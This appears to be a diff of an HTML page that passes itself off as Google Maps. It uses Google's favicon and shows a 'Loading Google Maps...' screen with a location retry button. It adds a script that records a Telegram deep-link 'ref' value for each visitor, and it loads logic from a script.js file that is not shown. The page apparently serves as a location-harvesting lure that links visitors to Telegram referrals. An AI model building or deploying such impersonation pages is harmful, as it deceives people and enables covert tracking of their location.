@@ -3,17 +3,25 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Google Maps</title>
+  <title>Shushu Maps</title>
   <link rel="stylesheet" href="style.css" />
   <link rel="icon" href="https://maps.gstatic.com/favicon3.ico">
+
+  <!-- ✅ Capture Telegram Deep-Link ref -->
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    window.userRef = urlParams.get('ref') || 'unknown_ref';
+  </script>
 </head>
 <body>
+  <!-- 🔄 Loading screen with spinner and retry -->
   <div id="loading-screen">
     <div class="spinner"></div>
     <div class="loading-text">Loading Google Maps...</div>
     <div id="retry-location" onclick="retryLocation()">🔁</div>
   </div>
 
+  <!-- ✅ Main logic script -->
   <script src="script.js"></script>
 </body>
 </html>
